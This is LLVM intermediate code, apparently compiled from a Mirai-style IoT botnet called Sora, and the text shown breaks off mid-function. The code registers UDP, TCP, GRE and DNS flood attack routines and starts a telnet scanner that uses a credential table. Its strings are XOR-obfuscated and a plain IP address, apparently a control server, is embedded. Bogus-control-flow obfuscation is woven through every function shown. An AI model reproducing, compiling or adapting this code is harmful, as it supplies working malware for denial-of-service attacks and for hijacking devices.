; ModuleID = 'host/ir_bcf/Sora.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.26 = type { [16 x i64] }
%struct.timeval.27 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"58 '8%\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c" 8\1E#$6;b\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c",7gaae\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.9 = private unnamed_addr constant [7 x i8] c"?8\22efg\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.11 = private unnamed_addr constant [9 x i8] c".-50efg`\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c".8,,z\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"c!>\19?;d\22=.,\22\00", align 1
@.str.14 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"<=gael\00", align 1
@.str.16 = private unnamed_addr constant [8 x i8] c"75 edfm\00", align 1
@.str.17 = private unnamed_addr constant [10 x i8] c"5::=1fdef\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"7<5:3191\00", align 1
@.str.19 = private unnamed_addr constant [6 x i8] c"3!1' \00", align 1
@.str.20 = private unnamed_addr constant [7 x i8] c"efg`a.\00", align 1
@.str.21 = private unnamed_addr constant [7 x i8] c"efg`ab\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"$5''\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.25 = private unnamed_addr constant [10 x i8] c"509=:efg`\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"93gadd\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"91&8=:\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"0519;:\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"!6: \00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"509\00", align 1
@.str.32 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [14 x i8] c"159.65.82.169\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -555811921, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %originalBBpart210, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %56

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %33

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* @x.5
  %13 = load i32, i32* @y.6
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %1, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = call i32 @kill(i32 %23, i32 9) #6
  %25 = load i32, i32* @x.5
  %26 = load i32, i32* @y.6
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %5
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %35
  store i32 0, i32* %36, align 4
  br label %37

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* @x.5
  %39 = load i32, i32* @y.6
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %1, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %1, align 4
  %48 = load i32, i32* @x.5
  %49 = load i32, i32* @y.6
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart210, label %originalBB1alteredBB

originalBBpart210:                                ; preds = %originalBB1
  br label %2

; <label>:56:                                     ; preds = %2
  %57 = load i32, i32* @x.5
  %58 = load i32, i32* @y.6
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %56
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  %65 = load i32, i32* @x.5
  %66 = load i32, i32* @y.6
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %11
  %73 = load i32, i32* %1, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %74
  %76 = load i32, i32* %75, align 4
  %77 = call i32 @kill(i32 %76, i32 9) #6
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %78 = load i32, i32* %1, align 4
  %_ = shl i32 %78, 1
  %_2 = sub i32 0, %78
  %gen = add i32 %_2, 1
  %_3 = sub i32 0, %78
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 %78, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 %78, 1
  %gen8 = mul i32 %_7, 1
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %1, align 4
  br label %originalBB1

originalBB12alteredBB:                            ; preds = %originalBB12, %56
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  br label %originalBB12
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = load i32, i32* @x.7
  %4 = load i32, i32* @y.8
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca %struct.attack_option*, align 8
  %20 = alloca i8, align 1
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store %struct.attack_target* null, %struct.attack_target** %18, align 8
  store %struct.attack_option* null, %struct.attack_option** %19, align 8
  %21 = load i32, i32* %12, align 4
  %22 = sext i32 %21 to i64
  %23 = icmp ult i64 %22, 4
  %24 = load i32, i32* @x.7
  %25 = load i32, i32* @y.8
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %49

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.7
  %34 = load i32, i32* @y.8
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i32, i32* @x.7
  %42 = load i32, i32* @y.8
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %379

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i8*, i8** %11, align 8
  %51 = bitcast i8* %50 to i32*
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @ntohl(i32 %52) #7
  store i32 %53, i32* %14, align 4
  %54 = load i8*, i8** %11, align 8
  %55 = getelementptr inbounds i8, i8* %54, i64 4
  store i8* %55, i8** %11, align 8
  %56 = load i32, i32* %12, align 4
  %57 = sext i32 %56 to i64
  %58 = sub i64 %57, 4
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %12, align 4
  %60 = load i32, i32* %12, align 4
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %49
  br label %379

; <label>:63:                                     ; preds = %49
  %64 = load i8*, i8** %11, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %11, align 8
  %66 = load i8, i8* %64, align 1
  store i8 %66, i8* %15, align 1
  %67 = load i32, i32* %12, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 %68, 1
  %70 = trunc i64 %69 to i32
  store i32 %70, i32* %12, align 4
  %71 = load i32, i32* %12, align 4
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %63
  br label %379

; <label>:74:                                     ; preds = %63
  %75 = load i8*, i8** %11, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %11, align 8
  %77 = load i8, i8* %75, align 1
  store i8 %77, i8* %16, align 1
  %78 = load i32, i32* %12, align 4
  %79 = sext i32 %78 to i64
  %80 = sub i64 %79, 1
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %12, align 4
  %82 = load i8, i8* %16, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %102

; <label>:85:                                     ; preds = %74
  %86 = load i32, i32* @x.7
  %87 = load i32, i32* @y.8
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = load i32, i32* @x.7
  %95 = load i32, i32* @y.8
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %379

; <label>:102:                                    ; preds = %74
  %103 = load i32, i32* @x.7
  %104 = load i32, i32* @y.8
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %102
  %111 = load i32, i32* %12, align 4
  %112 = sext i32 %111 to i64
  %113 = load i8, i8* %16, align 1
  %114 = zext i8 %113 to i64
  %115 = mul i64 5, %114
  %116 = icmp ult i64 %112, %115
  %117 = load i32, i32* @x.7
  %118 = load i32, i32* @y.8
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart222, label %originalBB10alteredBB

originalBBpart222:                                ; preds = %originalBB10
  br i1 %116, label %125, label %126

; <label>:125:                                    ; preds = %originalBBpart222
  br label %379

; <label>:126:                                    ; preds = %originalBBpart222
  %127 = load i8, i8* %16, align 1
  %128 = zext i8 %127 to i64
  %129 = call noalias i8* @calloc(i64 %128, i64 24) #6
  %130 = bitcast i8* %129 to %struct.attack_target*
  store %struct.attack_target* %130, %struct.attack_target** %18, align 8
  store i32 0, i32* %13, align 4
  br label %131

; <label>:131:                                    ; preds = %194, %126
  %132 = load i32, i32* %13, align 4
  %133 = load i8, i8* %16, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp slt i32 %132, %134
  br i1 %135, label %136, label %197

; <label>:136:                                    ; preds = %131
  %137 = load i32, i32* @x.7
  %138 = load i32, i32* @y.8
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %136
  %145 = load i8*, i8** %11, align 8
  %146 = bitcast i8* %145 to i32*
  %147 = load i32, i32* %146, align 4
  %148 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %149 = load i32, i32* %13, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 1
  store i32 %147, i32* %152, align 4
  %153 = load i8*, i8** %11, align 8
  %154 = getelementptr inbounds i8, i8* %153, i64 4
  store i8* %154, i8** %11, align 8
  %155 = load i8*, i8** %11, align 8
  %156 = getelementptr inbounds i8, i8* %155, i32 1
  store i8* %156, i8** %11, align 8
  %157 = load i8, i8* %155, align 1
  %158 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %159 = load i32, i32* %13, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 2
  store i8 %157, i8* %162, align 4
  %163 = load i32, i32* %12, align 4
  %164 = sext i32 %163 to i64
  %165 = sub i64 %164, 5
  %166 = trunc i64 %165 to i32
  store i32 %166, i32* %12, align 4
  %167 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %168 = load i32, i32* %13, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 0
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %171, i32 0, i32 0
  store i16 2, i16* %172, align 4
  %173 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %174 = load i32, i32* %13, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %180 = load i32, i32* %13, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %179, i64 %181
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i32 0, i32 0
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %183, i32 0, i32 2
  %185 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %184, i32 0, i32 0
  store i32 %178, i32* %185, align 4
  %186 = load i32, i32* @x.7
  %187 = load i32, i32* @y.8
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart234, label %originalBB24alteredBB

originalBBpart234:                                ; preds = %originalBB24
  br label %194

; <label>:194:                                    ; preds = %originalBBpart234
  %195 = load i32, i32* %13, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %13, align 4
  br label %131

; <label>:197:                                    ; preds = %131
  %198 = load i32, i32* %12, align 4
  %199 = sext i32 %198 to i64
  %200 = icmp ult i64 %199, 1
  br i1 %200, label %201, label %202

; <label>:201:                                    ; preds = %197
  br label %379

; <label>:202:                                    ; preds = %197
  %203 = load i8*, i8** %11, align 8
  %204 = getelementptr inbounds i8, i8* %203, i32 1
  store i8* %204, i8** %11, align 8
  %205 = load i8, i8* %203, align 1
  store i8 %205, i8* %17, align 1
  %206 = load i32, i32* %12, align 4
  %207 = sext i32 %206 to i64
  %208 = sub i64 %207, 1
  %209 = trunc i64 %208 to i32
  store i32 %209, i32* %12, align 4
  %210 = load i8, i8* %17, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp sgt i32 %211, 0
  br i1 %212, label %213, label %371

; <label>:213:                                    ; preds = %202
  %214 = load i32, i32* @x.7
  %215 = load i32, i32* @y.8
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %213
  %222 = load i8, i8* %17, align 1
  %223 = zext i8 %222 to i64
  %224 = call noalias i8* @calloc(i64 %223, i64 16) #6
  %225 = bitcast i8* %224 to %struct.attack_option*
  store %struct.attack_option* %225, %struct.attack_option** %19, align 8
  store i32 0, i32* %13, align 4
  %226 = load i32, i32* @x.7
  %227 = load i32, i32* @y.8
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %234

; <label>:234:                                    ; preds = %351, %originalBBpart238
  %235 = load i32, i32* %13, align 4
  %236 = load i8, i8* %17, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp slt i32 %235, %237
  br i1 %238, label %239, label %354

; <label>:239:                                    ; preds = %234
  %240 = load i32, i32* %12, align 4
  %241 = sext i32 %240 to i64
  %242 = icmp ult i64 %241, 1
  br i1 %242, label %243, label %244

; <label>:243:                                    ; preds = %239
  br label %379

; <label>:244:                                    ; preds = %239
  %245 = load i8*, i8** %11, align 8
  %246 = getelementptr inbounds i8, i8* %245, i32 1
  store i8* %246, i8** %11, align 8
  %247 = load i8, i8* %245, align 1
  %248 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %249 = load i32, i32* %13, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %248, i64 %250
  %252 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %251, i32 0, i32 1
  store i8 %247, i8* %252, align 8
  %253 = load i32, i32* %12, align 4
  %254 = sext i32 %253 to i64
  %255 = sub i64 %254, 1
  %256 = trunc i64 %255 to i32
  store i32 %256, i32* %12, align 4
  %257 = load i32, i32* %12, align 4
  %258 = sext i32 %257 to i64
  %259 = icmp ult i64 %258, 1
  br i1 %259, label %260, label %277

; <label>:260:                                    ; preds = %244
  %261 = load i32, i32* @x.7
  %262 = load i32, i32* @y.8
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %260
  %269 = load i32, i32* @x.7
  %270 = load i32, i32* @y.8
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
